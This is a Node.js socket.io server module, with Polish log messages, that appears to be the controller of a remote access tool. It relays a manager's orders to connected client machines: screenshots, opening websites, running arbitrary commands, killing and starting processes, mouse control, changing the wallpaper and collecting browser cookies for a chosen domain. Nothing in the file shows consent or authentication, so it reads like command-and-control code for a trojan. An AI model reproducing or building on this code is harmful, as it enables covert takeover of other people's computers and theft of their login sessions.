const {Host, Action} = require('../sequelize');
const {Op} = require('sequelize');

module.exports = (namespace, sio) => {
    namespace.on('connection', socket => {

        console.log('Manager connected')

        socket.on('screenshoot', async (data) => {
            console.log('Manager chce ss')
            if (data && data.clientId) {
                sio.of('/clients').to(data.clientId).emit('screenshot', data);
            } else {
                sio.of('/clients').emit('screenshot');
            }
        })

        socket.on('website', (data) => {
            console.log('Manager chce otworzyc strone')
            console.log(data);
            if (data && data.clientId) {
                sio.of('/clients').to(data.clientId).emit('website', data)
            } else {
                sio.of('/clients').emit('website', data)
            }
        })

        socket.on('command', (data) => {
            console.log('Manager chce przeslac komende')
            if (data && data.clientId) {
                sio.of('/clients').to(data.clientId).emit('command', data.command)
            } else {
                sio.of('/clients').emit('command', data)
            }
        })

        socket.on('getSystemInfoFromClient', (data) => {
            console.log(data);
            // Wykonujemy zapytanie do klienta by przeslal info o systemie
            sio.of('/clients').to(data.clientId).emit('systemInfo');
        })

        socket.on('fetchSystemInfo', (data) => {
            console.log(data);
        })

        socket.on('process_list', (data) => {
            sio.of("/clients").to(data.clientId).emit("process_list");
        })

        socket.on('process_kill', (data) => {
            sio.of('/clients').to(data.clientId).emit("process_kill", data);
        })

        socket.on('process_start', (data) => {
            sio.of('/clients').to(data.clientId).emit("process_start", data);
        })

        socket.on("mouse", (data) => {
            sio.of('/clients').to(data.clientId).emit("mouse", {type: data.type, p: data.p});
        })

        socket.on("mouse_click", (data) => {
            sio.of('/clients').to(data.clientId).emit("mouse_click", {type: data.type});
        })

        socket.on("wallper", (data) => {
            sio.of('/clients').to(data.clientId).emit("wallper", {wallper_url: data.wallper_url});
            console.log(data);
        })

        socket.on("cookies", (data) => {
            sio.of('/clients').to(data.clientId).emit("cookies", {domain: data.domain, clientId: data.clientId});
            console.log(data);
        })

        socket.on('actions', async data => {
            const url = new URL(data.url);
            const host = await Host.findOne({where: {
                [Op.or]: [
                    {tag: url.hostname},
                    {alias: url.hostname}
                ]
            }})
            console.log(host)

            const actions = await Action.findAll({where: {HostId: host.dataValues.id}})
            let actionsData = [];
            actions.map(action => {
                console.log(action)
                const actionObj = {tag: action.tag, name: action.name}
                actionsData.push(actionObj);
            })

            console.log(actionsData);

            sio.of('/manager').emit('actions', {actions: actionsData})
        })
    })
}